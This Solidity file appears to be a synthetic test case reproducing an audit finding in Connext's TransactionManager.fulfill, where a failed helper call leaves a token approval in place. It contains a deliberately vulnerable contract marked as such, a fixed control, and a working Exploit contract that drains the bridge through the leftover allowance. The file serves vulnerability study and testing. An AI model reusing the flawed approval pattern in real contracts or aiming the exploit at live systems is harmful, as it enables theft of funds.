// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Connext TransactionManager.fulfill — a failed helper keeps its approval
    (Code4rena 2021-07, finding 25506).
    SYNTHETIC, cheatcode-free. fulfill approves callTo for toSend, then
    addFunds reverts. The catch pays the user and does not reset the approval
    (@> VULN). A later balance of 1000 is pulled by that leftover allowance.
    The control sets the allowance back to 0 in the catch. */

contract MockToken {
    string public name = "NEXT";
    string public symbol = "NEXT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IFulfillHelper {
    function addFunds(address user, bytes32 transactionId, address assetId, uint256 amount) external;
}

contract BadHelper is IFulfillHelper {
    MockToken public token;

    constructor(address _token) {
        token = MockToken(_token);
    }

    function addFunds(address, bytes32, address, uint256) external pure {
        revert("helper failed");
    }

    function steal(address bridge, address to, uint256 amount) external {
        token.transferFrom(bridge, to, amount);
    }
}

contract TransactionManager {
    MockToken public token;
    address public user;

    constructor(address _token, address _user) {
        token = MockToken(_token);
        user = _user;
    }

    function fulfill(address callTo, address receivingAddress, bytes32 transactionId, uint256 toSend) external {
        require(token.approve(callTo, toSend), "fulfill: APPROVAL_FAILED");
        try IFulfillHelper(callTo).addFunds(user, transactionId, address(token), toSend) {}
        catch {
            // @> VULN: the fallback transfer runs and the approval of callTo is left in place
            require(token.transfer(receivingAddress, toSend), "fulfill: TRANSFER_FAILED");
        }
    }
}

contract TransactionManagerFixed {
    MockToken public token;
    address public user;

    constructor(address _token, address _user) {
        token = MockToken(_token);
        user = _user;
    }

    function fulfill(address callTo, address receivingAddress, bytes32 transactionId, uint256 toSend) external {
        require(token.approve(callTo, toSend), "fulfill: APPROVAL_FAILED");
        try IFulfillHelper(callTo).addFunds(user, transactionId, address(token), toSend) {}
        catch {
            require(token.transfer(receivingAddress, toSend), "fulfill: TRANSFER_FAILED");
            // FIX: drop the helper's allowance after the fallback transfer
            require(token.approve(callTo, 0), "reset");
        }
    }
}

contract Exploit {
    MockToken public token;
    BadHelper public helper;
    TransactionManager public bridge;
    address public user;
    address public sink;
    uint256 public constant AMOUNT = 1_000 ether;
    bytes32 public constant TXID = keccak256("tx");

    constructor() {
        token = new MockToken();
        helper = new BadHelper(address(token));
        user = address(new Receiver());
        sink = address(new Receiver());
        bridge = new TransactionManager(address(token), user);
    }

    function run() external {
        token.mint(address(bridge), AMOUNT);
        bridge.fulfill(address(helper), user, TXID, AMOUNT);
        require(token.allowance(address(bridge), address(helper)) == AMOUNT, "allowance left");
        require(token.balanceOf(user) == AMOUNT, "user paid");
        token.mint(address(bridge), AMOUNT);
        helper.steal(address(bridge), sink, AMOUNT);
        require(token.balanceOf(sink) == AMOUNT, "taken");
        require(token.balanceOf(address(bridge)) == 0, "bridge drained");
    }
}

contract Receiver {}
